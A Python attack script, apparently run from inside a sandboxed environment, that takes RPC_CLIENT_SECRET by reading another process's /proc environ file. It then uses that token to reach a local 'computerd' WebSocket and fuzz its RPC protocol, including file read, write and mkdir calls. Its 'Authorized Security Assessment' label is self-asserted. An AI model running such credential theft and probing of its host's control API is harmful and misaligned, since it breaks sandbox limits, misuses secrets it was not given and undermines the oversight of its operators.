#!/usr/bin/env python3
"""Probe computerd WebSocket with capnweb array-tuple RPC format.
The error responses ["abort",[...]] reveal the protocol uses JSON arrays
where element[0] is the message type. capnweb (Cloudflare internal) uses
array-based RPC calls.
Authorized Security Assessment.
"""
import subprocess, os, json, socket, struct, base64, time

LOG = "/mnt/data/output/computerd_capnweb_rpc.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

# ── Token recovery ──
out, _, _ = subprocess.run("ps aux 2>/dev/null", shell=True, capture_output=True, text=True, timeout=5).stdout, "", 0
pa_pid = None
for line in (out or "").split("\n"):
    if "process-api" in line and "python" in line and "grep" not in line:
        pa_pid = line.split()[1]
        break
if not pa_pid:
    pa_pid = "88"

rpc_secret = None
try:
    with open(f"/proc/{pa_pid}/environ", "rb") as f:
        raw = f.read()
    for var in raw.decode("utf-8", errors="replace").split("\0"):
        if var.startswith("RPC_CLIENT_SECRET="):
            rpc_secret = var.split("=", 1)[1]
except:
    pass

if not rpc_secret:
    log("FATAL: No RPC_CLIENT_SECRET")
    with open(LOG, "w") as f:
        f.write("\n".join(lines) + "\n")
    exit(1)

log("=" * 70)
log("  COMPUTERD capnweb RPC PROTOCOL PROBE")
log("  Authorized Security Assessment")
log("=" * 70)
log(f"  Bearer: {rpc_secret[:4]}...{rpc_secret[-4:]}")

def ws_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(("127.0.0.1", 8080))
    ws_key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET /api HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8080\r\n"
        f"Authorization: Bearer {rpc_secret}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    if b"101" not in resp.split(b"\r\n")[0]:
        s.close()
        return None
    return s

def ws_send(sock, msg):
    if isinstance(msg, str):
        payload = msg.encode("utf-8")
        opcode = 0x81
    else:
        payload = msg
        opcode = 0x82
    mask_key = os.urandom(4)
    masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    frame = bytearray()
    frame.append(opcode)
    length = len(payload)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack(">Q", length))
    frame.extend(mask_key)
    frame.extend(masked)
    sock.sendall(bytes(frame))

def ws_recv(sock, timeout=3):
    sock.settimeout(timeout)
    try:
        header = sock.recv(2)
        if len(header) < 2:
            return None, "incomplete"
        opcode = header[0] & 0x0F
        masked = bool(header[1] & 0x80)
        length = header[1] & 0x7F
        if length == 126:
            length = struct.unpack(">H", sock.recv(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", sock.recv(8))[0]
        if masked:
            mask_key = sock.recv(4)
        payload = b""
        while len(payload) < length:
            chunk = sock.recv(min(length - len(payload), 65536))
            if not chunk:
                break
            payload += chunk
        if masked:
            payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        ops = {1: "TEXT", 2: "BIN", 8: "CLOSE", 9: "PING", 10: "PONG"}
        op = ops.get(opcode, f"0x{opcode:x}")
        if opcode == 1:
            return op, payload.decode("utf-8", errors="replace")
        elif opcode == 8:
            code = struct.unpack(">H", payload[:2])[0] if len(payload) >= 2 else 0
            return "CLOSE", f"{code}: {payload[2:].decode('utf-8', errors='replace')}"
        else:
            return op, payload.hex()[:300]
    except socket.timeout:
        return "TIMEOUT", ""
    except Exception as e:
        return "ERROR", str(e)

def probe(sock, msg, label=""):
    if isinstance(msg, (list, dict)):
        text = json.dumps(msg)
    else:
        text = msg
    ws_send(sock, text)
    # Read up to 2 responses (abort + close pattern)
    results = []
    for _ in range(2):
        op, data = ws_recv(sock, timeout=2)
        if op is None or op == "TIMEOUT":
            break
        results.append((op, data))
        if op == "CLOSE":
            break
    return results

sock = ws_connect()
if not sock:
    log("FATAL: WebSocket connect failed")
    with open(LOG, "w") as f:
        f.write("\n".join(lines) + "\n")
    exit(1)
log("\n  WebSocket connected.\n")

# Drain any initial message
op, data = ws_recv(sock, timeout=2)
if op and op != "TIMEOUT":
    log(f"  Server hello: [{op}] {data[:300]}")

# ══════════════════════════════════════════════════════════════
# capnweb uses array-based message format. The error response
# ["abort", ["error", "Error", "..."]] tells us:
#   - Messages are JSON arrays
#   - First element is message type string
#   - The "abort" type carries an error tuple
#
# Likely call format: ["call", callId, methodName, ...args]
# or: ["call", objectId, methodName, ...args]
# ══════════════════════════════════════════════════════════════

log("── PHASE 1: Message type discovery ──")
probes_phase1 = [
    # Array with known capnweb message types
    ["call"],
    ["call", 0],
    ["call", 0, "list"],
    ["call", 0, "list", "/"],
    ["call", 1, "list", "/"],
    ["invoke"],
    ["invoke", 0, "list"],
    ["request"],
    ["request", 0, "list"],
    ["method"],
    ["rpc"],
    ["sync"],
    ["ready"],
    ["ping"],
    ["pong"],
    ["hello"],
    ["init"],
    ["connect"],
    ["subscribe"],
    ["resolve"],
    ["reject"],
    ["return"],
    ["deliver"],
    # Numeric message types
    [0],
    [1],
    [2],
    [0, "list", "/"],
    [1, "list", "/"],
    [2, "list", "/"],
]

for p in probes_phase1:
    results = probe(sock, p)
    label = json.dumps(p)[:60]
    for op, data in results:
        log(f"  {label:60} → [{op}] {data[:200]}")
    if any(op == "CLOSE" for op, _ in results):
        sock.close()
        sock = ws_connect()
        if not sock:
            log("  Reconnect failed!")
            break
        ws_recv(sock, timeout=1)

log("\n── PHASE 2: Object/capability probes ──")
if sock:
    probes_phase2 = [
        # capnweb capability-based RPC patterns
        ["call", "sync", "watermarks"],
        ["call", "sync", "watermarks", []],
        ["call", "fs", "list", ["/"]],
        ["call", "fs", "mkdir", ["/tmp/test"]],
        ["call", "fs", "readdir", ["/"]],
        ["call", "fs", "stat", ["/"]],
        ["call", "vfs", "list"],
        ["call", "vfs", "readdir", "/"],
        # Workspace API methods from workspace-sync.ts
        ["call", "ready"],
        ["call", "ready", []],
        ["call", "ready", [{"all": True}]],
        ["call", "push"],
        ["call", "pull"],
        ["call", "close"],
        ["call", "mkdir", ["/tmp/test"]],
        ["call", "rm", ["/tmp/test"]],
        # Direct method names
        ["readdir", "/"],
        ["getattr", "/"],
        ["stat", "/"],
        ["read", "/etc/hostname"],
        ["write", "/tmp/test", "hello"],
        ["mkdir", "/tmp/test"],
        ["lookup", "/", "etc"],
        # E2E patterns from @cloudflare/computer SDK
        ["call", 0, "ready", [{"all": True}]],
        ["call", 0, "push", []],
        ["call", 0, "pull", []],
        ["call", 0, "close", []],
        ["call", 0, "fs", []],
    ]

    for p in probes_phase2:
        results = probe(sock, p)
        label = json.dumps(p)[:60]
        for op, data in results:
            log(f"  {label:60} → [{op}] {data[:200]}")
        if any(op == "CLOSE" for op, _ in results):
            sock.close()
            sock = ws_connect()
            if not sock:
                log("  Reconnect failed!")
                break
            ws_recv(sock, timeout=1)

log("\n── PHASE 3: capnweb 0.10 wire format patterns ──")
if sock:
    # capnweb uses a specific JSON encoding for RPC:
    # ["message_type", sequence_id, ...payload]
    # Common types: "bootstrap", "call", "return", "finish", "release", "resolve"
    # Based on Cap'n Proto RPC protocol
    probes_phase3 = [
        # Cap'n Proto RPC bootstrap
        ["bootstrap", 0],
        ["bootstrap", 0, 0],
        ["bootstrap", 1],
        # Cap'n Proto call format:
        # ["call", questionId, target, interfaceId, methodId, params]
        ["call", 0, 0, 0, 0, []],
        ["call", 0, 0, 0, 0, {}],
        ["call", 0, {"importedCap": 0}, 0, 0, []],
        ["call", 0, {"importedCap": 0}, 0, 0, {}],
        ["call", 1, {"importedCap": 0}, 0, 0, None],
        ["call", 1, 0, 0, 0, None],
        # Finish / release
        ["finish", 0],
        ["finish", 0, True],
        ["release", 0],
        ["release", 0, 1],
        # Resolve
        ["resolve", 0],
        # Disembargo
        ["disembargo", 0],
        # capnweb specific bootstrap with question
        ["bootstrap", 0, {"questionId": 0}],
        ["bootstrap", {"questionId": 0}],
    ]

    for p in probes_phase3:
        results = probe(sock, p)
        label = json.dumps(p)[:60]
        for op, data in results:
            log(f"  {label:60} → [{op}] {data[:200]}")
        if any(op == "CLOSE" for op, _ in results):
            sock.close()
            sock = ws_connect()
            if not sock:
                log("  Reconnect failed!")
                break
            ws_recv(sock, timeout=1)

log("\n── PHASE 4: Single-element and nested arrays ──")
if sock:
    probes_phase4 = [
        # Try single element arrays of various types
        [None],
        [True],
        [False],
        [""],
        [[]],
        [{}],
        # Nested structures
        [["call", 0, "list"]],
        [0, []],
        [0, {}],
        [0, None],
        [0, 0],
        [0, 0, 0],
        [0, 0, 0, 0],
        [0, 0, 0, 0, 0],
        [0, 0, 0, 0, 0, 0],
        # String-only arrays matching capnp message types
        ["message", "call", "list"],
        ["message", "bootstrap"],
    ]

    for p in probes_phase4:
        results = probe(sock, p)
        label = json.dumps(p)[:60]
        for op, data in results:
            log(f"  {label:60} → [{op}] {data[:200]}")
        if any(op == "CLOSE" for op, _ in results):
            sock.close()
            sock = ws_connect()
            if not sock:
                log("  Reconnect failed!")
                break
            ws_recv(sock, timeout=1)

if sock:
    sock.close()

log("\n" + "=" * 70)
with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nSaved: {LOG}")
